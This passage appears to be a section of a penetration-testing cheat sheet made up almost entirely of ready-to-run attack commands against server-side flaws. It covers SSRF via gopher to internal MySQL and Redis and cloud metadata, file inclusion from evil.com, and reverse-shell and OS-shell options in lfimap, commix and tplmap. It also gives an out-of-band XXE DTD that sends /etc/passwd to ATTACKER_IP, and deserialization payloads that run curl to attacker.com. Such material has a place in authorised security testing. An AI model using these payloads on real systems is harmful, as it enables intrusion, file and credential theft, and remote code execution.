### 3.4 Server-Side Vulnerabilities
#### 3.4.1 SSRF Testing
    :- Automated SSRF exploitation on 'url' parameter
    ssrfmap -r request_for_ssrf.txt -p url -m http,gopher --lhost your_server_ip 
    
    :- Use Interactsh for OOB detection
    ssrfmap -r req.txt -p file --handler interactsh
    
    :- Attempt to read local files via SSRF
    ssrfmap -r req.txt -p u --module readfiles --lfile /etc/passwd

    
    :- Start Interactsh client for OOB interactions
    interactsh-client
    
    :- Manual SSRF test with Interactsh
    curl -X POST -d "url=http://YOUR_INTERACTSH_ID.oastify.com" https://target.com/proxy 

    
    :- Inject SSRF payloads from file and check status
    qsreplace "http://target.com/proxy?url=FUZZ" -a "ssrf_payloads.txt" | httpx -silent -status-code -mc 200 
    -----
        ssrfmap -r request.txt -p url=https://yourcollab.com
    ssrfmap -r request.txt -p url=https://yourcollab.com -m portscan
    gopherus --exploit mysql
    gopherus --exploit mysql --inject 'curl https://collab.net'
    ground-control -u https://target.com/redirect?url=COLLAB
    qsreplace -a urls.txt -p ssrf_payloads.txt -o ssrf_urls.txt
    ------
    ssrfmap -r request.txt -p url=https://$(whoami).oastify.com -m portscan -ports 80,443,21,22
    ssrfmap -r post_request.txt -p callback=http://your-server.com/receive -X POST
    gopherus --exploit mysql --inject 'SELECT LOAD_FILE("\\\\\\\\evil\\\\\\\\share\\\\\\\\file.txt")' | curl -v --data-urlencode "url=gopher://127.0.0.1:3306/_$(cat -)" https://target.com/proxy
    gopherus --exploit redis --command "SLAVEOF your-server.com 6379" | curl -v --data-urlencode "url=gopher://127.0.0.1:6379/_$(cat -)" https://target.com/api
    ground-control -u https://target.com/redirect?url=file:///etc/passwd -w /usr/share/wordlists/fuzzdb/wordlists-common/file-extensions-common.txt
    ground-control -u https://target.com/proxy?u=http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
    qsreplace -a urls.txt -p "http://localhost,http://127.0.0.1,file:///,gopher://" -o ssrf_potential.txt
    ------
    ssrfmap -r request.txt -p url=dict://localhost:11211/info -m portscan -ports 1-1000
    ssrfmap -r post_request.txt -p callback=http://[::1]:80/receive -X POST
    gopherus --exploit mysql --inject 'SELECT @@version' | curl -v --data-urlencode "url=gopher://127.0.0.1:3306/_$(cat -)" https://target.com/proxy
    gopherus --exploit redis --command "PING" | curl -v --data-urlencode "url=gopher://127.0.0.1:6379/_$(cat -)" https://target.com/api
    ground-control -u https://target.com/redirect?url=http://169.254.169.254/latest/meta-data/ -w /usr/share/wordlists/fuzzdb/wordlists-common/file-extensions-common.txt -H "X-Forwarded-For: 127.0.0.1"
    ground-control -u https://target.com/proxy?u=http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
    qsreplace -a urls.txt -p "http://0,http://0.0.0.0,http://[::],file:///,gopher://,ftp://" -o ssrf_bypasses.txt



#### 3.4.2 File Inclusion (LFI/RFI)
    :- Test LFI and RFI, attempt reverse shell
    lfimap -u 'https://target.com/page?file=FUZZ' --rfi --lhost YOUR_IP --lport 4444 
    
    :- Heuristic-based LFI detection
    lfimap -u 'https://target.com/download?path=FUZZ' --heuristics --level 2
    
    :- Use custom LFI wordlist
    lfimap -u 'https://target.com/include.php?page=FUZZ' -w /usr/share/wordlists/wfuzz/general/lfi.txt 

    
    :- Directory traversal tool
    dotdotpwn -m http -h target.com -u "/scripts/download.php?file=TRAVERSAL" -k "root:" -o dotdotpwn_results.txt 
    
    :- Standard traversal, look for /etc/passwd
    dotdotpwn -m http -h target.com -f /etc/passwd -s
    ------
        lfisuite -u https://target.com/view?file=index.html -o lfi_results.txt
    fimap -u 'https://target.com/page?file=XXE' -x
    dotdotpwn -m http -h target.com -u /vuln/page?f=TRAVERSAL -k root
    ------
    lfisuite -u https://target.com/view?file=../../../../etc/passwd -o lfi_results_passwd.txt -b "root:"
    lfisuite -u https://target.com/index.php?page=http://evil.com/malicious.txt -o rfi_evil.txt -r "evil content"
    fimap -u 'https://target.com/page?file=XXE' -x -o fimap_xxe.txt --rhost evil.com --rport 8080
    fimap -u 'https://target.com/image?name=../../../../etc/shadow' --lfi-only -o fimap_lfi_shadow.txt
    dotdotpwn -m http -h target.com -u /vuln/page?f=TRAVERSAL -k root -d 5 -t 10
    dotdotpwn -m ftp -h target.com -u /../../../../etc/passwd -P 21 -k root
    ------
    lfisuite -u https://target.com/view?file=....//....//....//etc/passwd -o lfi_results_dots.txt -b "root:"
    lfisuite -u https://target.com/index.php?page=http://evil.com/malicious.txt%00 -o rfi_nullbyte.txt -r "evil content"
    fimap -u 'https://target.com/page?file=XXE' -x -o fimap_xxe_full.txt --rhost evil.com --rport 8080 --data '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>'
    fimap -u 'https://target.com/image?name=..%2f..%2f..%2f..%2fetc%2fshadow' --lfi-only -o fimap_lfi_encoded.txt
    dotdotpwn -m http -h target.com -u /vuln/page?f=TRAVERSAL -k root -d 7 -t 15 -s /usr/share/seclists/Fuzzing/LFI/LFI-paths.txt
    dotdotpwn -m ftp -h target.com -u /../../../../../../../../etc/passwd -P 21 -k root -o ftp_lfi.txt


#### 3.4.3 Command Injection
    :- Test command injection, run whoami
    commix -u "https://target.com/cmd.php?command=FUZZ" --os-cmd "whoami"
    
    :- POST based, get OS shell
    commix --url="https://target.com/exec?host=127.0.0.1" --data="host=127.0.0.1&submit=submit" -p host --os-shell 
    
    :- Test all injectable parameters from a request file
    commix -r request.txt -p param_to_inject --all


#### 3.4.4 XXE (XML External Entity) Injection
    :- (Manual testing with custom XML payloads is key. Tools can help automate detection)

    :- Example XXE Payload (to be used in a request body or file upload):
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
    <data>&xxe;</data>
    #
    For OOB XXE:
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_IP:PORT/ext.dtd"> %xxe;]>
    Contents of ext.dtd on attacker server:
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP:PORT/?f=%file;'>">
    %eval;
    %exfil;

    :- (nuclei has XXE templates)    
    :- Run XXE templates
    nuclei -u https://target.com/xml_endpoint -t vulnerabilities/xxe/ 
    ---
        xxeinjector -f request.xml
    docem -u https://target.com/upload


#### 3.4.5 Prototype Pollution
    :- (Primarily a JavaScript vulnerability, manual testing and code review are crucial)
    :- Example in URL: https://target.com/?__proto__[isAdmin]=true
    :- Example in JSON body: {"__proto__": {"isAdmin": true}}
    :- Tools like ppfuzz or custom scripts can help discover potential gadgets.
    
    :- Conceptual: Fuzz for prototype pollution gadgets
    ppfuzz -u https://target.com/script.js -l 3


#### 3.4.6 HTTP Request Smuggling/Desync Attacks
    :- (Tools like Burp's HTTP Request Smuggler extension are essential. CLI tools can help test.)
    
    :- Test for CL.TE and TE.CL vulnerabilities
    smuggler.py -u https://target.com -x
    
    :- Test POST with data, log results
    smuggler.py -u https://target.com -m POST -d "param=val" -l log.txt 
    Turbo Intruder (Burp Extension) is highly effective for this.


#### 3.4.7 Deserialization Vulnerabilities
    :- (Highly language/framework specific. ysoserial for Java, phpggc for PHP)
    
    :- Generate Java deserialization payload
    java -jar ysoserial.jar CommonsCollections5 "curl http://attacker.com/hit" > java_payload.ser 
    
    :- Generate PHP deserialization payload
    phpggc Guzzle/FW1 RCE system "curl http://attacker.com/php_hit" > php_payload.phar 
    (These payloads would then be sent in appropriate request parameters/bodies)


#### 3.4.8 Server-Side Template Injection (SSTI)
    :- (Manual testing with language-specific payloads is common)
    Example Payloads:
    {{ 7*7 }} (Jinja2/Twig)
    <%= 7*7 %> (Ruby ERB)
    ${7*7} (Java EL, Freemarker)
    #{7*7} (Java JSF)
    @(7*7) (Razor .NET)
    
    :- Automated SSTI detection and exploitation
    tplmap -u "https://target.com/page?name=FUZZ" --os-shell
    
    :- Test POST parameter
    tplmap -u "https://target.com/search" -d "query=FUZZ" --os-cmd "whoami" 


#### 3.4.9 CRLF Injection
    crlfuzz -u "https://target.com" -p 10

#### 3.4.10 CORS Misconfigurations
    corsy -u https://target.com